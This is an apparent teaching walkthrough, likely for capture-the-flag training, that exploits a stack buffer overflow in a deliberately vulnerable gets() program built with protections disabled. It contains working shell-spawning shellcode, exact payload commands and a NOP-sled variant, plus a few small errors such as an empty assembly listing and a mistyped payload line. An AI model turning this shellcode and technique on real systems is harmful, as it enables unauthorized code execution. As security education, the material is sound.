  <h1>Simple exploit walkthrough</h1>
  <hr />
  <h2>Setup</h2>
  <p>You can get all of the files that this tutorial discusses
  <a href="exploit_walkthrough.tar.gz">here</a></p>
  <p>In order to work on this exploit, we need to disable ASLR.  This
  is a security feature that we will learn about later.  To do this
  issue the following command in your shell:</p>
<pre class="language-none"><code>
$ exec setarch linux32 -R /bin/bash
</code></pre>
  <p>This will disable ASLR for your current shell.  The rest of your OS,
  however, is still protected, so don't worry.</p>
  <h2>The vulnerable program (vulnerable.c)</h2>
<pre class="language-c"><code>
#include &lt;stdio.h&gt;

void vuln() {
    char buf[32];
    printf("What's your name? ");
    gets(buf);
    printf("Hi, %s!\n", buf);
}

int main() {
    vuln();
    return 0;
}
</code></pre>
  <p>Can you spot the vulnerability in this function?</p>
  <p>The vulnerability is the call to
  <code class="language-c">gets(buf)</code>.  This function will read a
  string from standard input and put it in buf.  The problem is that it
  does not check if buf is actually big enough to hold the result!  It just
  keeps on writing characters, no matter what actually resides in memory.
  We can use this to exploit the program.  Our attack will be a classic
  example of a buffer overflow exploit.</p>
  <p>First, let's compile this file.  It's already compiled in the tarball,
  but if you want to compile yourself the command is:</p>
<pre class="language-none"><code>
$ gcc -m32 -z execstack -fno-stack-protector vulnerable.c -o vulnerable
</code></pre>
  <p>Note: If you compile yourself, the generated assembly may look
  slightly different from what is shown in this walkthrough due to
  different versions of gcc and system configurations.  The
  <code class="language-none">-z execstack -fno-stack-protector</code>
  flags are there in order to disable some security features that
  would complicate this introduction.</p>
  <p>Let's play around with the executable:</p>
<pre class="language-none"><code>
$ ./vulnerable
What's your name? Blair
Hi, Blair!
$ ./vulnerable
What's your name? Blair Mason
Hi, Blair Mason!
$ python -c "print 'A'*256" | ./vulnerable
What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA!
Segmentation Fault
$
</code></pre>
  <p>Looks like we got the program to crash!  Why?  Well, it makes sense if
  you take a look.  The <code class="language-none">gets()</code> function
  read in 256 'A's and just blindly wrote them into memory, starting at the
  address of buf.  This is bound to run into something important and overwrite
  it.  Let's take a look at what happened by checking the kernel error
  logs:</p>
<pre class="language-none"><code>
$ dmesg | tail
[442278.585208] vulnerable[30671]: segfault at 41414141 ip 0000000041414141
sp 00000000ffffd860 error 14
$
</code></pre>
  <p>That error message (look for the one corresponding to your program)
  tells us that the segfault was triggered by trying to access memory address
  0x41414141.  What is 0x41 in ASCII? "A"! It also helps us by giving us the
  value of the instruction pointer (ip) and stack pointer (sp).  Look at
  the value of the instruction pointer: 0x41414141.  So the segfault was
  caused by the program trying to execute code starting at address
  0x41414141.</p>
  <p>Why did the program try to execute code from 0x41414141?  Recall the
  x86 calling convention.  The call instruction pushes the return address
  onto the stack and then jumps to the function.  The ret instruction pops
  that address off the stack and then jumps to that address.  However,
  what happens if the address is corrupted (overwritten) during the execution
  of the function?  The ret instruction still happily pops the address off
  the stack and jumps to it!  So now, we have a way to get the program to
  execute arbitrary code.</p>
  <h2>Disassembly and Reverse Engineering</h2>
  <p>Now, our goal is to get a little bit more specific information about
  the program so we can craft our exploit payload.  Our goal will be to
  execute some arbitrary code.  This code, we hope, will spawn us a shell.
  So, we'll call it our shellcode.  Don't worry about the actual contents
  of this code for now - we'll cover that later.</p>
  <p>We can get a look at the actual assembly code by using the objdump
  command:</p>
<pre class="language-none"><code>
$ objdump -d -Mintel vulnerable &gt; vulnerable.asm
</code></pre>
  <p>This gives us a dump of the assembly code.  The dump has three
  columns.  The first column is the address of the instruction.  The
  second column is the sequence of bytes that exists in memory at that
  location.  The third column is the assembly instructions that corrospond
  to that machine code.  Take a look at the vuln function (this isn't
  rocket science; just Ctrl+F or / for those of you awesome enough to
  be using less or vim):
<pre class="language-nasm"><code>

</code></pre>
  <p>Before we begin analyzing this function, make sure you follow the
  number one rule of reverse engineering assembly code:  always draw out
  your stack!  Make sure you use pencil so you can keep updating memory,
  or in the best case have a whiteboard available.</p>
  <p>This function is pretty unremarkable.  We first have our standard
  function prologue.  Then, we subtract 0x38 from esp, which allocates
  0x38 (56) bytes of space on the stack.</p>
  <p>We then move an address into eax, and place that at the top of the
  stack.  Then we call printf.  Note that we don't push the arguments like
  we would if we were handwriting assembly.  A lot of the time, compilers
  don't manually push/pop arguments but instead allocate a bit of extra
  space on the stack and just place arguments on the stack where they are
  supposed to go.  So, the first argument to the function is at the top
  of the stack (i.e., [esp]), the second argument right below that on the
  stack (and thus right above it in memory, [esp+4]), the third at [esp+8],
  etc.</p>
  <p>So how do we find out what the first argument to printf is?  Well, we
  can figure it out by looking at the C code, but we do not always have
  that available.  In that case, objdump comes to our rescue once again:
  </p>
<pre class="language-none"><code>
$ objdump -s vulnerable &gt; vulnerable.dump
</code></pre>
  <p>This file looks a lot like if you opened up a hex editor on RAM while
  running the program.  The headers tell you which section you are in.  For
  this case, the address we are looking for resides in the .rodata segment,
  which is just like the .data segment we used earlier except that the
  compiler has marked it as read only.</p>
<pre class="language-none"><code>
Contents of section .rodata:
 8048548 03000000 01000200 57686174 27732079  ........What's y
 8048558 6f757220 6e616d65 3f200048 692c2025  our name? .Hi, %
 8048568 73210a00    
</code></pre>
  <p>When reading this dump, the first column is the memory
  address of the first byte displayed on that line.  After that is a
  sequence of hexadecimal digits that show the contents of that memory
  starting at that address, one dword (4 bytes) per grouping and 16 bytes
  per line.  After that is the ascii representation corrosponding to the
  contents you just saw in hex, with non-printable characters 
  represented by periods.  So, as you can see from the dump, the
  contents of memory at the address we passed to printf (0x8048550) is
  the string "What's your name? ".</p>
  <p>After calling printf, we load the address ebp-0x28 into eax, and place
  this address at the top of the stack.  We then call gets.  So, the
  buffer we want to overflow starts at address ebp-0x28.  We also know from
  the calling convention that the return address will reside at ebp+4.  So,
  there is a total of 0x28 + 4 = 0x2c = 44 bytes of space between the
  beginning of our buffer and the address we want to return to.  In this
  case, we'll place our shellcode immediately after the return address in
  memory, so our payload will be: 44 bytes of junk ("A"*44) + Shellcode
  Address + Shellcode.</p>
  <h2>Shellcode</h2>
  <p>Shellcode is not incredibly complex assembly code.  The goal of
  shellcode is to spawn a shell.  The most common way to do this is
  by calling the execve /bin/bash system call.  You can find the calling
  convention for system calls <a href="x86_table.html">here</a>.</p>
<pre class="language-nasm"><code>
[BITS 32]

; Note that we MUST have a valid stack for this to work!

xor ecx, ecx       ; zero ecx
mul ecx            ; edx:eax = eax*ecx, i.e. zeros edx and eax
mov al, 0xb        ; set eax to 0xb, syscall number for execve
push ecx           ; pushes a zero onto the stack (stack is \0\0\0\0)
push '//sh'        ; push '//sh' onto stack (stack is //sh\0\0\0\0)
push '/bin'        ; push '/bin' onto stack (stack is /bin//sh\0\0\0\0)
mov ebx, esp       ; set ebx (arg1: path) to stack pointer ("/bin//sh")
push ecx           ; push another zero (execve needs a NULL at the end)
push ebx           ; push addr of "/bin//sh"
mov ecx, esp       ; set ecx (arg2: argv) to ["/bin//sh", 0]
                   ; edx (arg3: envp) is already NULL from `mul ecx`
int 0x80           ; perform system call
</code></pre>
  <p>You should be able to figure out how that works if you look at the
  calling convention, the man page for execve (2), look at those comments,
  and draw your stack out.  If you have issues, come talk to me.</p>
  <p>Now, we want to assemble this code out into a flat binary file:</p>
<pre class="language-none"><code>
$ nasm shellcode.asm -o shellcode
</code></pre>
  <p>We can then use a small script to dump the shellcode as a string.
  Ths script (getascii):</p>
<pre class="language-python"><code>
#!/usr/bin/env python
import sys

if len(sys.argv) != 2:
    sys.stderr.write('USAGE: ' + sys.argv[0] + ' FILE\n')
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    byte = f.read(1)
    mystr = ''
    while byte != "":
        s = hex(ord(byte[0]))
        if len(s) == 3:
            mystr += '\\x0' + s[2:]
        else:
            mystr += '\\x' + s[2:]
        byte = f.read(1)
    print('"'+mystr+'"')
</code></pre>
  <p>chmod that script so you can use it, and then we'll run the script.
  I'm also going to save it into an environment variable to make things
  clearer in this tutorial, but you can just copy and paste if you want.
  With more complex payloads, it is actually useful to copy your
  shellcode into a python script as the payload will be a bit much for a
  one liner.</p>
<pre class="language-none"><code>
$ ./getascii shell
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x51\x53\x89\xe1\xcd\x80"
$ SHELLCODE=`./getascii shell`
</code></pre>
  <p>Now, we'll write our payload, with a dummy return to 0xdeadbeef to
  make sure that everything works.  Note that the return address is
  converted into <em>little endian</em>:</p>
<pre class="language-none"><code>
$ python -c "print 'A'*44+'\xef\xbe\xad\xde'+$SHELLCODE" | ./vulnerable
What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAﾭQh//shh/binS!
Segmentation fault
$ dmesg | tail
[616178.375511] vulnerable[16929]: segfault at deadbeef ip 00000000deadbeef
sp 00000000ffffd860 error 14
</code></pre>
  <p>Now, we see that the program segfaults accessing deadbeef, and that
  deadbeef is accessed because the program is trying to execute code at
  that location.  This is good.  So now, we want to change that deadbeef
  to the address of our shellcode.  Once we've popped the return address
  off the stack with the ret instruction, the stack pointer is going to
  point to whatever is directly above (in terms of the memory address,
  but beneath on the stack) in memory.  Because of where we put our
  shellcode, this happens to be the shellcode itself!  So, we can just
  fill in the stack pointer that dmesg gives us (NOTE: This will be different
  on your system!).  Let's dump our shellcode into a file:</p>
<pre class="language-none"><code>
$ python -c "print -c 'A'*44+'\x60\xd8\xff\xff'+$SHELLCODE" &gt; payload
</code></pre>
  <p>Now, we execute our attack on this program.  We want to first send our
  payload to the program, and then we need to send standard input over
  to the program so that we can send commands to the shell.  So, the
  actual attack:</p>
<pre class="language-none"><code>
$ cat payload - | ./vulnerable
What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAﾭQh//shh/binS!
ls
payload vulnerable vulnerable.asm vulnerable.c vulnerable.dump
whoami
m164122
</code></pre>
  <p>Note that the shell will not give you any prompts; you just have to
  try typing commands and see if they work.</p>
  <p>Congratulations! You've completed the helloworld of binary
  exploitation!  Rejoice at the sight of your shell!  After many long
  hours of staring at hexadecimal during a CTF it is the most beautiful
  sight in the world...</p>
  <h2>NOP Sleds</h2>
  <p>In some cases, you cannot precisely compute the address of your
  shellcode.  In other cases, you might be feeling lazy and not want
  to bother to precisely compute the address you want to jump to.  So,
  we use a technique called a NOP sled.  NOP is a machine instruction,
  opcode 0x90, which essentially tells the machine to continue on to
  the next instruction.  If we string a bunch of these together before
  our shellcode, then we can just guess an address.  If the address we
  guess points to anywhere in our NOP sled the machine will walk along
  the sled and gladly continue on to our shellcode.</p>
  <p>So, let's redesign our payload using a NOP sled.  We can be much
  lazier when designing a NOP sled payload, as nothing has to line up
  perfectly - just good enough.  Let's bring up the code for vuln
  again:</p>
<pre class="language-c"><code>
void vuln() {
    char buf[32];
    printf("What's your name? ");
    gets(buf);
    printf("Hi, %s!\n", buf);
}
</code></pre>
  <p>We see that our buffer is 32 bytes long, and there are no other
  variables allocated on the stack.  We know that the compiler is going
  to add in some other stuff/space on the stack, so let's just pick
  the next highest round number - 64 bytes (remember that round numbers
  are powers of 2 for us now!).  We'll fill this up with copies of the
  address we want to write.  The number of copies we'll need to write
  is 64 bytes / (4 bytes/copy) = 16 copies of the return address. Then,
  we'll add in a decent sized NOP Sled - let's say 256 NOPs.  Last, our
  shellcode.  Now, let's get a rough estimate for what address we should
  pick:</p>
<pre class="language-none"><code>
$ python -c "print 'A'*256" | ./vulnerable
What's your name? Hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA!
Segmentation Fault
$ dmesg | tail
[442278.585208] vulnerable[30671]: segfault at 41414141 ip 0000000041414141
sp 00000000ffffd850 error 14
</code></pre>
  <p>We know our NOP sled is going to start somewhere around the vicinity
  of the stack pointer location at the crash.  Our NOP sled is 256 = 0x100
  bytes long, so we'll take half that (0x80) and add that to the stack
  pointer value at the crash to get 0xffffd8d0.  That should be about
  midway through our NOP sled and thus give us the best chance of hitting.
  So, the moment of truth:</p>
<pre class="language-none"><code>
$ python -c "print '\xd0\xd8\xff\xff'+'\x90'*256+$SHELLCODE" &gt; payload
$ cat payload - | ./vulnerable
What's your name? Hi, ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ1Qh//shh/binS!
ls
getascii  payload  shell  shell.asm  vulnerable  vulnerable.c
</code></pre>
  <p>How much easier was that?  Draw out what memory should look like and
  convince yourself as to why it works.  You need to have a solid
  understanding of how the first exploit (that we precisely calculated)
  works in order to really get why we can be lazy using this NOP sled.
  If you want to get an exploit quickly, the NOP sled is an important tool
  to decrease the amount of work you have to do.  It also enables certain
  more advanced techniques that would be otherwise impossible.  Once you
  get how these exploits work (by doing the first one a few times) you will
  appreciate the simplicity of not having to be exact about memory.
  <h2>Further Work</h2>
  <p>This is a basic walkthrough on how to craft an exploit.  However,
  we turned off a lot of common mitigation techniques that are in use on
  modern machines.  We will go over some of these later, but the important
  information to gain from this is the basic walkthrough on the actual
  process of analysis, reverse engineering, payload crafting, and attack.
  In an actual competition later levels will take some of this information
  away from you.  They will place the program you need to exploit on a
  remote computer, so you no longer have nice diagnostics like dmesg to
  tell you how the program is failing.  They will not give you C source
  code.  They will turn on some (usually not all) of the mitigations that
  we turned off.  <strong>BUT</strong>, the basic techniques and the
  workflow for exploiting the program is the same - the only thing that
  changes is some of the details on how to craft the payload.</p>
